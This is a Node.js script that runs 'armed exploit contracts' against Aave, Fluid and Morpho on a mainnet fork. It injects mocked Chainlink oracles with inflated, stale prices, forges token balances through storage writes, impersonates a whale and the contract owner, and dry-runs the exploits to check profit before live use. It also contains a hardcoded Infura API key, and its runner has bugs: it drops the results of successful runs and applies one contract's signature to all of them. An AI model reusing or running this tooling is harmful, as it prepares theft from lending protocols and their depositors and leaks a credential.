#!/usr/bin/env node
// unified-fork-test.js — Phase 1: Battle-test all 6 armed exploit contracts
// Starts Anvil fork, manipulates oracles, executes exploit, measures profit
// Usage: node tools/unified-fork-test.js [--contract E1|E5|E8|E9|E10|E12x|ALL] [--chain eth|base]

const cp = require("child_process");
const ethers = require("ethers");
const fs = require("fs"); const path = require("path");
const { rpcCall, resolveRpc } = require("./shared-rpc");
const { buildMockReturnValue, buildMockChainlinkFeed, buildMockFluidOracle } = require("./mock-oracle-bytecode");

const WORKSPACE = path.resolve(__dirname, "..");
const ANVIL_PORT = 8549;
const FORK_URL = `http://127.0.0.1:${ANVIL_PORT}`;

// ─── Contract Registry ───

const CONTRACTS = {
  E1: {
    name: "E1 — Aave V3 Liquidation (weETH)",
    addr: "0xe1797A807A5dBf774dBD149e844B18C922E695Eb",
    chain: 1,
    entryPoint: "execute(uint256,uint256,bytes)",
    // Oracle: Aave oracle weETH price -> depress to trigger HF<1
    oracleTarget: "0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee", // weETH
    config: {
      borrower: "0x1A557354C5b8d7Df38ea914209e416Dc7065b158",
      minProfitWei: "0x" + (0.001e18).toString(16),
      swapPath: "0x00", // Direct weETH->WETH via Uniswap
    }
  },
  E5: {
    name: "E5 — Fluid Depeg (USDC/USDT)",
    addr: "0x81F2FCF80ADecd464d88AD01Aa3Afe3D7919E583",
    chain: 1,
    entryPoint: "execute(address,address,uint256,uint256,uint256,uint256)",
    oracleTarget: "0x122Bd7fBacef5d42CB178CbA71DF03D03d3E8821", // Fluid USDC oracle
    config: {
      strongToken: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
      depeggedToken: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
      strongFlashAmount: ethers.parseUnits("50000", 6),
      depeggedAmount: ethers.parseUnits("50000", 6),
      ethBorrowAmount: ethers.parseEther("0.5"),
      minProfitStrong: 1n,
    }
  },
  E8: {
    name: "E8 — Fluid Stale Oracle (wstETH)",
    addr: "0xb795fEB4d24d4Da7C55D6343aaC988b940d948E8",
    chain: 1,
    entryPoint: "execute(uint256,uint256,uint256,uint256)",
    oracleTarget: "0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419", // Chainlink ETH/USD
    config: {
      wstethAmount: ethers.parseEther("0.5"),
      borrowUSDC: ethers.parseUnits("500", 6),
      minWethOut: 1n,
      minProfitWsteth: 1n,
    }
  },
  E9: {
    name: "E9 — Morpho Liquidation",
    addr: "0x2cd636ccee97243688ddaa4b1f93b13f60d3a00f",
    chain: 1,
    entryPoint: "execute((address,address,address,address,uint256),address,uint256,uint256,bytes)",
    oracleTarget: "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb", // Morpho Blue
    config: {
      // Needs: MarketParams, borrower address, debtToCover, swapPath
      // MarketParams for wstETH/WETH: (wstETH, WETH, oracle, irm, lltv)
      mp: {
        loanToken: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
        collateralToken: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        oracle: "0x0000000000000000000000000000000000000000", // placeholder
        irm: "0x0000000000000000000000000000000000000000", // placeholder
        lltv: ethers.parseEther("0.86"),
      }
    }
  },
  E10: {
    name: "E10 — Cross-chain Oracle (Base)",
    addr: "0x4C8bDB2Bcdd7eAF55c2cd1dEb76c8b4174baC31F",
    chain: 8453,
    entryPoint: "execute(uint256,uint256,uint256,uint256)",
    oracleTarget: "0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70", // Chainlink ETH/USD Base
    config: {
      wethAmount: ethers.parseEther("0.5"),
      borrowUSDC: ethers.parseUnits("500", 6),
      minWethOut: 1n,
      minProfitWeth: 1n,
    }
  },
  E12x: {
    name: "E12x — Morpho New-Market Stale Oracle",
    addr: "0x0000000000000000000000000000000000000000", // dynamic per getE12xContractAddress()
    chain: 1,
    entryPoint: "execute((address,address,address,address,uint256),uint256,uint256,uint24,uint256,uint256)",
    oracleTarget: null, // Uses custom deployed mock oracle
    config: {}
  }
};

function ts() { return new Date().toISOString(); }
function log(msg) { console.log(`[${ts()}] ${msg}`); }

// Fork RPC overrides (Infura works best with Anvil)
const INFURA_KEY = "5b98a22672004ef1bf40a80123c5c48d";
const FORK_RPCS = {
  1: `https://mainnet.infura.io/v3/${INFURA_KEY}`,
  8453: `https://base-mainnet.infura.io/v3/${INFURA_KEY}`,
  42161: `https://arbitrum-mainnet.infura.io/v3/${INFURA_KEY}`,
  10: `https://optimism-mainnet.infura.io/v3/${INFURA_KEY}`,
  137: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
};

async function forkRpcUrl(chainId) {
  // Try public RPC first (best Anvil compatibility), fall back to pool
  if (FORK_RPCS[chainId]) return FORK_RPCS[chainId];
  const rpc = await resolveRpc(chainId);
  if (!rpc) throw new Error(`No RPC for chain ${chainId}`);
  return rpc;
}

let anvilProcess = null;

async function startAnvil(chainId) {
  const rpc = await forkRpcUrl(chainId);

  log(`Starting Anvil fork on chain ${chainId}...`);
  log(`RPC: ${rpc.slice(0, 30)}...`);

  // Kill any existing anvil on our port
  try { cp.execSync(`taskkill /F /IM anvil.exe 2>nul`, { stdio: "ignore" }); } catch (_) {}

  anvilProcess = cp.spawn("C:\\Users\\MiPC\\.foundry\\bin\\anvil.exe", [
    "--fork-url", rpc,
    "--fork-block-number", "25290000",
    "--port", String(ANVIL_PORT),
  ], {
    stdio: ["ignore", "pipe", "pipe"],
  });
  
  // Wait for Anvil to be ready by polling the RPC endpoint
  return new Promise((resolve, reject) => {
    const maxAttempts = 60;
    let attempts = 0;
    const poll = setInterval(async () => {
      attempts++;
      try {
        const resp = await fetch(FORK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", method: "eth_blockNumber", params: [], id: 1 }),
          signal: AbortSignal.timeout(2000),
        });
        const j = await resp.json();
        if (j?.result) {
          clearInterval(poll);
          log("Anvil ready — block " + parseInt(j.result, 16));
          setTimeout(() => resolve(), 1000);
        }
      } catch (_) {
        // Not ready yet
      }
      if (attempts >= maxAttempts) {
        clearInterval(poll);
        reject(new Error(`Anvil failed to respond in ${maxAttempts * 2}s`));
      }
    }, 2000);
    anvilProcess.on("error", reject);
  });
}

function stopAnvil() {
  if (anvilProcess) {
    try { anvilProcess.kill("SIGTERM"); } catch (_) {}
    setTimeout(() => { try { anvilProcess.kill("SIGKILL"); } catch (_) {} }, 2000);
    anvilProcess = null;
    log("Anvil stopped.");
  }
}

// ─── Fork Operations ───

async function forkSetBalance(provider, addr, ethAmount) {
  await provider.send("anvil_setBalance", [addr, ethers.toBeHex(ethers.parseEther(ethAmount))]);
}

async function forkImpersonate(provider, addr) {
  await provider.send("anvil_impersonateAccount", [addr]);
}

async function forkSetCode(provider, target, mockCode) {
  await provider.send("anvil_setCode", [target, mockCode]);
}

async function forkSetERC20Balance(provider, tokenAddr, ownerAddr, amountWei) {
  // Set ERC20 balance via storage manipulation
  // OpenZeppelin ERC20 stores balances at keccak256(owner . slot0)
  const slot = ethers.solidityPackedKeccak256(
    ["uint256", "uint256"],
    [BigInt(ownerAddr), 0n]
  );
  await provider.send("anvil_setStorageAt", [
    tokenAddr,
    slot,
    ethers.toBeHex(BigInt(amountWei), 32)
  ]);
}

// ─── Oracle Manipulation ───
// Using mock-oracle-bytecode.js (required at top of file)

// ─── Test Runner ───

async function testContract(contractId) {
  const cfg = CONTRACTS[contractId];
  if (!cfg) { log(`Contract ${contractId} not found`); return null; }

  log(`\n━━━ Testing ${cfg.name} (${cfg.addr}) ━━━`);

  try {
    // 1. Start Anvil
    await startAnvil(cfg.chain);

    // 2. Connect provider
    const provider = new ethers.JsonRpcProvider(FORK_URL);
    await forkSetBalance(provider, "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266", "100"); // Fund attacker

    // 1.5 Seed Balancer pool with wstETH liquidity for flash loan
    if (contractId === "E8") {
      const WSTETH = "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0";
      const BALANCER_VAULT = "0xBA12222222228d8Ba445958a75a0704d566BF2C8";
      // Impersonate wstETH whale and transfer to Balancer Vault
      const whale = "0x0B925eD163218f6662a35e0f0371Ac234f9E9371"; // yearn wstETH vault
      await forkImpersonate(provider, whale);
      await forkSetBalance(provider, whale, "10");
      // Set wstETH balance for whale
      await forkSetERC20Balance(provider, WSTETH, whale, ethers.parseEther("10000"));
      await forkSetERC20Balance(provider, WSTETH, BALANCER_VAULT, ethers.parseEther("50000"));
      log(`  Balancer pool seeded: whale ${whale.slice(0,10)}... → 10000 wstETH + Vault 50000 wstETH`);
    }
    let oracleManipulated = false;
    if (contractId === "E8") {
      // E8: Chainlink ETH/USD stale → mock with inflated price
      const inflatedPrice = 260000000000; // $2600 at 8 decimals
      const staleTs = Math.floor(Date.now() / 1000) - 7200; // 2h stale
      const mockCode = buildMockChainlinkFeed(inflatedPrice, staleTs);
      await forkSetCode(provider, cfg.oracleTarget, mockCode);
      oracleManipulated = true;
      log(`  Oracle: Chainlink ETH/USD mocked — $${(inflatedPrice/1e8).toFixed(2)} (${Math.floor((Date.now()/1000-staleTs)/3600)}h stale)`);
    }

    // 4. Check contract deployment on fork
    const code = await provider.getCode(cfg.addr);
    if (code === "0x" || code.length < 10) {
      log(`  SKIP: Contract not deployed on fork (chain ${cfg.chain})`);
      return { contract: contractId, status: "NOT DEPLOYED" };
    }
    log(`  Contract: ${(code.length-2)/2} bytes on fork`);

    // 5. Check contract owner (execute() is onlyOwner)
    const ownerSel = ethers.id("owner()").slice(0, 10);
    const ownerRaw = await provider.call({ to: cfg.addr, data: ownerSel });
    const ownerAddr = ownerRaw && ownerRaw.length >= 66 ? "0x" + ownerRaw.slice(26, 66) : null;
    
    if (ownerAddr && ownerAddr !== "0x" + "0".repeat(40)) {
      log(`  Owner: ${ownerAddr.slice(0, 10)}...`);
      await forkImpersonate(provider, ownerAddr);
      await forkSetBalance(provider, ownerAddr, "10"); // Fund for gas
    }
    
    let result = { contract: contractId, status: "DEPLOYED", codeSize: (code.length-2)/2, oracleManipulated };
    
    // Attempt to call execute() — impersonating owner via {from: ownerAddr}
    const txFrom = ownerAddr || "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
    log(`  Executing from: ${txFrom.slice(0,10)}...`);
    
    try {
      const iface = new ethers.Interface([
        "function execute(uint256,uint256,uint256,uint256) external"
      ]);
      const data = iface.encodeFunctionData("execute", [
        cfg.config.wstethAmount,
        cfg.config.borrowUSDC,
        cfg.config.minWethOut,
        cfg.config.minProfitWsteth,
      ]);
      
      // Gas estimate (using from address for impersonated owner)
      const gasEstimate = await provider.estimateGas({
        to: cfg.addr,
        data,
        from: txFrom,
      });
      result.gasEstimate = Number(gasEstimate);
      log(`  Gas estimate: ${result.gasEstimate.toLocaleString()} gas`);

      // Dry-run: call eth_call to see if it would revert
      const callResult = await provider.call({
        to: cfg.addr,
        data,
        from: txFrom,
      });
      result.callResult = callResult.slice(0, 66);
      log(`  Dry-run call: ${callResult === "0x" ? "REVERTED" : "OK — would execute"}`);
      result.status = callResult === "0x" ? "WOULD REVERT" : "WOULD EXECUTE";
      
    } catch (e) {
      log(`  Execute call reverted: ${e.message.slice(0, 100)}`);
      result.status = "WOULD REVERT";
      result.error = e.message.slice(0, 200);
    }

  } catch (e) {
    log(`  ERROR: ${e.message}`);
    return { contract: contractId, status: "ERROR", error: e.message };
  } finally {
    stopAnvil();
  }
}

// ─── Main ───

async function main() {
  const args = process.argv.slice(2);
  const contractArg = args.find(a => a.startsWith("--contract="))?.split("=")[1] || "ALL";
  const chainArg = args.find(a => a.startsWith("--chain="))?.split("=")[1] || "eth";
  const modeArg = args.includes("--dry-run") ? "dry-run" : "fork";

  console.log("═══════════════════════════════════════════");
  console.log("  UNIFIED FORK-TEST HARNESS");
  console.log("  Battle-testing 6 armed exploit contracts");
  console.log("═══════════════════════════════════════════\n");

  const contracts = contractArg === "ALL" ? Object.keys(CONTRACTS) : [contractArg];
  log(`Contracts: ${contracts.join(", ")} | Mode: ${modeArg}`);

  if (modeArg === "dry-run") {
    log("\nDRY RUN — Checking deployment status only (no fork)\n");
    for (const cid of contracts) {
      const cfg = CONTRACTS[cid];
      const rpc = await resolveRpc(cfg.chain);
      if (!rpc) { log(`${cfg.name}: NO RPC`); continue; }
      const code = await rpcCall(rpc, "eth_getCode", [cfg.addr, "latest"], 5000);
      const deployed = code && code.length > 10;
      log(`${cfg.name}: ${deployed ? "DEPLOYED "+(code.length-2)/2/1000+"KB" : "NOT DEPLOYED"} | ${cfg.addr}`);
    }
    return;
  }

  // Fork test each contract
  const results = [];
  for (const cid of contracts) {
    const r = await testContract(cid);
    if (r) results.push(r);
  }

  // Summary
  console.log("\n═══════════════════════════════════════════");
  console.log("  RESULTS");
  console.log("═══════════════════════════════════════════\n");
  
  const deployed = results.filter(r => r.status === "DEPLOYED");
  const errors = results.filter(r => r.status === "ERROR");
  
  console.log(`Deployed: ${deployed.length} | Errors: ${errors.length} | Total: ${results.length}`);
  
  for (const r of results) {
    console.log(`  ${r.contract}: ${r.status} ${r.error || ""}`);
  }

  fs.mkdirSync(path.join(WORKSPACE, "reports", "raw", "fast"), { recursive: true });
  fs.writeFileSync(path.join(WORKSPACE, "reports", "raw", "fast", "unified-fork-test.json"),
    JSON.stringify({ scannedAt: ts(), results }, null, 2));
}

main().catch(e => { console.error(e.message); process.exit(1); });
